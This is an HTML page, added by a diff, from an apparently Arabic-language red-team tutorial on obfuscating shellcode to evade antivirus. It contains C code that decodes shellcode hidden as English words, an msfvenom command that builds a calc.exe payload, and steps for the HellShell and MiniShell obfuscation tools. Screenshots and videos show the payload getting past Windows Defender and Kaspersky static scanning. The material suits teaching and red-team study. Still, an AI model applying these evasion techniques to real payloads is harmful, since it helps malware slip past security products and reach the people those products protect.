+        &nbsp;&nbsp;"music", "music", "music", "yards", "debug", "birth", "coins", "shirt",<br>
+        &nbsp;&nbsp;"yards", "taste", "frost", "feels", "bears", "yards", "strap", "cells",<br>
+        &nbsp;&nbsp;"bears", "slope", "yacht", "smoke", "taste", "frost", "usage", "tours",<br>
+        &nbsp;&nbsp;"yards", "visit", "diane", "scuba", "bears", "swift", "guest", "yards",<br>
+        &nbsp;&nbsp;"taste", "james", "blink", "exist", "diane", "yards", "exist", "birth",<br>
+        &nbsp;&nbsp;"stone", "scuba", "games", "diane", "puppy", "scuba", "taste", "games",<br>
+        &nbsp;&nbsp;"tires", "solve", "nokia", "grams", "sheet", "audio", "sheet", "heath",<br>
+        &nbsp;&nbsp;"lanka", "happy", "items", "today", "nokia", "buses", "fires", "cells",<br>
+        &nbsp;&nbsp;"bears", "slope", "heath", "smoke", "taste", "frost", "carey", "scuba",<br>
+        &nbsp;&nbsp;"bears", "screw", "yards", "cells", "bears", "slope", "fever", "smoke",<br>
+        &nbsp;&nbsp;"taste", "frost", "scuba", "bears", "endif", "guest", "yards", "taste",<br>
+        &nbsp;&nbsp;"frost", "scuba", "fires", "scuba", "fires", "mails", "bands", "firms",<br>
+        &nbsp;&nbsp;"scuba", "fires", "scuba", "bands", "scuba", "firms", "yards", "squad",<br>
+        &nbsp;&nbsp;"lloyd", "yacht", "scuba", "shoot", "visit", "solve", "fires", "scuba",<br>
+        &nbsp;&nbsp;"bands", "firms", "yards", "bears"<br>
+        &nbsp;&nbsp;};<br><br>
+        &nbsp;&nbsp;unsigned char shellcode[196] = { 0 };<br>
+        &nbsp;&nbsp;int sc_len = sizeof(shellcode);<br><br>
+
+        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert from Words ...\n");<br>
+        &nbsp;&nbsp;getchar();<br><br>
+
+        &nbsp;&nbsp;printf("[i] Converting shellcode...\n");<br>
+        &nbsp;&nbsp;for (int sc_index = 0; sc_index < 196; sc_index++) {<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;printf(""); <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;for (int tt_index = 0; tt_index <= 255; tt_index++) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode[sc_index] = tt_index;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                    &nbsp;&nbsp;}<br><br>
+
+                    &nbsp;&nbsp;printf("[i] Shellcode converted successfully! Size: %zu bytes\n", (sizeof(shellcode) - 1));<br>
+                    &nbsp;&nbsp;printf("\t");<br>
+                    &nbsp;&nbsp;int idx = 0;<br>
+                    &nbsp;&nbsp;while (idx < sizeof(shellcode))<br>
+                    &nbsp;&nbsp;{<br>
+                        &nbsp;&nbsp;if (idx == (sizeof(shellcode) - 1))<br>
+                        &nbsp;&nbsp;{<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("0x%02x ", (unsigned char)shellcode[idx]);<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((idx + 1) % 16 == 0) printf("\n\t");<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;else<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;{<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("0x%02x, ", (unsigned char)shellcode[idx]);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;if ((idx + 1) % 16 == 0) printf("\n\t");<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;idx++;<br>
+                                &nbsp;&nbsp;}<br><br>
+                                &nbsp;&nbsp;printf("\n\n");<br>
+                                &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...\n");<br>
+                                &nbsp;&nbsp;getchar();<br><br>
+
+                                &nbsp;&nbsp;return 0;<br>
+                 }<br>               
+                </code></div>
+                <br>
+
+
+                <h2 style="direction: ltr;">3. Tools :</h2>
+                <p>[+] بعد مـ عرفنا كل الطُرق اللـ إتكلمنا عليهم .. حابب أقولك إن فـ تولز بتسهل عليك الموضوع ده ، ومش
+                    محتاج تعمل كل دا بنفسك .. هتقولي طب لي مقولتهاش من الأول .. هقولك إن لازم تتعلم التكنيكس دي وتجرب
+                    بنفسك .. متكونش بصمجي يا هندسة وتستسهل.</p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+
+                <h3 style="direction: ltr;">3.1 HellShell Tool :</h3>
+                <p>[+] أول تول هي الـ HellShell .. ودي فيها مميزات جميلة وتقدر تشوف لينك الجيتهاب بتاعها من <a
+                        href="https://github.com/alex14324/Hellshell" target="_blank" class="download-link">[هنا]</a>.
+                </p>
+                <p>[+] بتقدر تعمل كل اللـ اتكلمنا عليه فوق ده ما عدا إنك تحول لـ Words .. بس بخلاف كده ، فيها كمان
+                    طريقتين
+                    للـ Encryption ، واللـ إتكلمنا عنهم المقالة اللـ فاتت وهما RC4 & AES.</p>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/HellShell-1.png" alt="HellShell-1" class="article-image" loading="lazy">
+                </div>
+                <ol>
+                    <li>هتفتح الملف HellShell.sln ، وهتعمل Build ع نمط الـ Release.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/HellShell-2.png" alt="HellShell-2" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنروح للـ Kali Linux ونكريت Payload بس فـ هيئة ملف binary.</li>
+                    <div class="code-block"><code>msfvenom -p windows/x64/exec CMD=calc.exe -o calc.bin</code></div>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/HellShell-3.png" alt="HellShell-3" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنا أول لما ترن التول هتعرف استخدامها وايه اللـ هي تقدر تعمله.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/HellShell-4.png" alt="HellShell-4" class="article-image" loading="lazy">
+                    </div>
+                    <li>هتديلها ملف الـ binary ، وتقدر تختار أي حاجه من اللـ فـ الصورة اللـ فاتت ، هتلاقيها طلعتلك انها
+                        عملتله Obfuscation ، وعطياك النتيجة ومعاك كمان الكود بتاع الـ Deobfuscation.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/HellShell-5.png" alt="HellShell-5" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] جرب التول واستكشف باقي اللـ فيها بنفسك ..... </p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+
+                <h3 style="direction: ltr;">3.2 MiniShell Tool :</h3>
+                <p>[+] تاني تول ودي بتسهل عليك جزء الـ Encryption .. وتقدر تشوف المصدر بتاعها ع جيتاب من <a
+                        href="https://github.com/alex14324/Minishell" target="_blank" class="download-link">[هنا]</a>.
+                </p>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/MiniShell-1.png" alt="MiniShell-1" class="article-image" loading="lazy">
+                </div>
+                <ol>
+                    <li>هتعمل Build ع وضع الـ Release زي التول اللـ فاتت.</li>
+                    <li>هتجرب تشغلها هتعرفك هي بتعمل إيه واستخدامها ايه.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/MiniShell-2.png" alt="MiniShell-2" class="article-image" loading="lazy">
+                    </div>
+                    <li>المميز فـ التول دي انها تقدر تعملك ملفات متشفرة .. وكمان معاك الأكواد لفك التشفير :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/MiniShell-3.png" alt="MiniShell-3" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p style="font-weight: bold;">[+] آخر جزء فـ المقالة وهو ، هنجرب اللـ عملناه النهاردة ع الـ Windows
+                    Defender ، والـ Kaspersky.</p>
+                <ol style="font-weight: bold;">
+                    <li>هنـ Build كل البروجيكتس ع نمط الـ Release.</li>
+                    <li>الـ IPv4 .. كدا Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-1.png" alt="Obfs-Bypass-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ IPv6 .. كمان Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-2.png" alt="Obfs-Bypass-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ MAC .. زيهم Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-3.png" alt="Obfs-Bypass-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ UUIDs .. اللـ بعدووو Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-4.png" alt="Obfs-Bypass-4" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ Words .. سيم Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-5.png" alt="Obfs-Bypass-5" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>[+] دلوقتي هنجرب ع الـ Kaspersky :</p>
+                <ol>
+                    <li>الـ IPv4 ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-6.png" alt="Obfs-Bypass-6" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ IPv6 ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-7.png" alt="Obfs-Bypass-7" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ MAC ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-8.png" alt="Obfs-Bypass-8" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ UUIDs ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-9.png" alt="Obfs-Bypass-9" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الـ Words ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Bypass-10.png" alt="Obfs-Bypass-10" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>[+] الفكرة ان كل اللـ عملناه حتي الآن ما هو إلا بنشفر الشيل كود وبنفكه .. يعني لسه مدناش له أي أمر
+                    إنه يـ execute .. فـ بقولهالك تاني .. كل دا بنعدي الـ Static Analysis بس ، إنما وقت لما يترن هيكون
+                    فيه كلام تاني عشان الـ Dynamic Analysis ، وهديلك مثال دلوقتي إننا نـ رن الشيل كود ويفتح الـ
+                    Calculator ، ومتقلقش لسه قدام هعلمك إزاي تديلة الأمر ويـ رن :</p>
+                <ul>
+                    <li>دا كدا الـ Kaspersky :</li>
+                </ul>
+                <video controls autoplay loop muted>
+                    <source src="../src/Pics/Kaspersky-Bypass.mp4" type="video/mp4">
+                </video>
+                <ul>
+                    <li>ودا الـ Windows Defender :</li>
+                </ul>
+                <video controls autoplay loop muted>
+                    <source src="../src/Pics/WinDefnd-Bypass.mp4" type="video/mp4">
+                </video>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>وبكدا . أتمني تكون استفدت حاجه .. ونلتقي فـ مقالة قادمة .. ولو عندك أي تعليق ، استفسار ، أي حاجه ..
+                    متترددش وكلمني.</p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
+                <h2>References</h2>
+                <p>خدلك لفة فـ المصادر والمراجع يا عزيزي:</p>
+
+                <li><a href="https://redsiege.com/blog/2024/08/adventures-in-shellcode-obfuscation-part-9-shellcode-as-ip-addresses/"
+                        target="_blank" class="download-link">Shellcode as IP Addresses</a></li>
+                <li><a href="https://redsiege.com/blog/2024/08/adventures-in-shellcode-obfuscation-part-10-shellcode-as-mac-addresses/"
+                        target="_blank" class="download-link">Shellcode as MAC Addresses</a></li>
+
+                </li>
+                <li><a href="https://redsiege.com/blog/2024/08/adventures-in-shellcode-obfuscation-part-8-shellcode-as-uuids/"
+                        target="_blank" class="download-link" s>Shellcode as UUIDs</a>
+                </li>
+                <li><a href="https://redsiege.com/blog/2023/07/obfuscating-shellcode-using-jargon/" target="_blank"
+                        class="download-link">Shellcode Using Jargon</a></li>
+
+                <li><a href="https://redsiege.com/blog/2024/08/adventures-in-shellcode-obfuscation-part-11-jargon/l"
+                        target="_blank" class="download-link">Jargon</a></li>
+                <li><a href="https://github.com/RedSiege/Chromatophore/tree/main/Jargon" target="_blank"
+                        class="download-link">Jargon Github</a></li>
+
+
+                <li style="font-weight: bold;"><a href="https://github.com/alex14324/Hellshell" target="_blank"
+                        class="download-link">Hellshell</a></li>
+
+                <li style="font-weight: bold;"><a href="https://github.com/alex14324/Minishell" target="_blank"
+                        class="download-link">Minishell</a></li>
+                <li><a href="https://medium.com/@lielomer76/bypassing-av-solution-using-simple-evasion-techniques-part-1-160cf90751c0"
+                        target="_blank" class="download-link" s>Bypassing AV Solution Using Simple Evasion
+                        Techniques</a>
+
+            </div>
+            <div class="nav-buttons">
+                <a href="#" onclick="nextArticle()" style="direction: ltr;">Next →</a>
+                <a href="./Payload-Encryption.html" onclick="previousArticle()" style="direction: ltr;">← Previous</a>
+            </div>
+    </section>
+    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
+        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
+    </footer>
+
+    <script src="../src/JS/script.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
+    <script>
+        window.onload = function () {
+            AOS.init({ offset: 0 });
+        };
+    </script>
+    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+
+</html>
